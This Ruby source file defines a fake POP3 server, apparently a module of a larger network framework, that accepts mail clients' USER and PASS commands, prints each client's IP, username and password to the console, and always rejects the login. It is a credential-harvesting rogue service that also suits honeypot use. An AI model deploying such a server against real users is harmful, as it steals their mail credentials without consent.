#!/usr/bin/env ruby
#
#
#

require 'gserver'

class Pop3Server
    def initialize(mod)
        @mod = mod
    end

    def run()
        @address = @mod.requires['NETWORK-INTERFACE'].options['address'] or
            raise "Require address option from NETWORK-INTERFACE"

        if (@mod.options['port'])
            @port = @mod.options['port']
        else
            @port = 110
        end

        @pop3 = GPop3Server.new(@address, @port)
        @pop3.start()

    end

    def stop()
        @pop3.stop()
    end
end

class GPop3Server < GServer
    def initialize(address = "0.0.0.0", port = 110)
        super(port, address)
    end
    
    def serve(io)
        ip = io.peeraddr[3]
        user = ""
        pass = ""
        
        io.print "+OK\r\n"
        
        while ((line = io.gets().chomp()))
            case line
            when /quit/i
                io.print "+OK\r\n"
                break
                
            when /user\s(.*)/i
                user = $1
                io.print "+OK\r\n"
                
            when /pass\s(.*)/i
                pass = $1
                
                puts "POP3: #{ip} #{user}/#{pass}"
                
                io.print "-ERR\r\n"
                
            else
                io.print "-ERR\r\n"
            end
        end
    end
end

